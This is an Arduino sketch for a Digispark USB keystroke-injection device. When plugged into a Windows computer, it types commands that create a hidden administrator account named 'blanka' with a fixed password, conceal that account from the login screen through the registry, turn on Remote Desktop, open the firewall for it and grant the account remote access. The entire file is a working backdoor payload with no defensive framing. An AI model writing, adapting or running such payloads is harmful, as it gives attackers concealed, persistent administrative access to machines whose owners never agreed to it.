#include "DigiKeyboard.h"
void setup() {
}

void loop() {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2500);
    
    /* Create Admin Backdoor Account + Remote Access */
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(750);
    DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("net user blanka Ping@123 /ADD"); // Add User
    DigiKeyboard.delay(750);
    DigiKeyboard.println("net localgroup Administrators blanka /ADD"); // Add User to Admin Group
    DigiKeyboard.delay(750);
    DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f")); // Hide User from Login Screen
    DigiKeyboard.delay(750);
    DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f")); // Turning Remote Desktop On
    DigiKeyboard.delay(750);
    DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes")); // Allowing RD on Firewall
    DigiKeyboard.delay(750);
    DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add"); // Add User to RD Group
    DigiKeyboard.delay(750);  
    DigiKeyboard.println("exit");
    DigiKeyboard.delay(750);

    for (;;) {
        /*Stops the digispark from running the scipt again*/
    }
}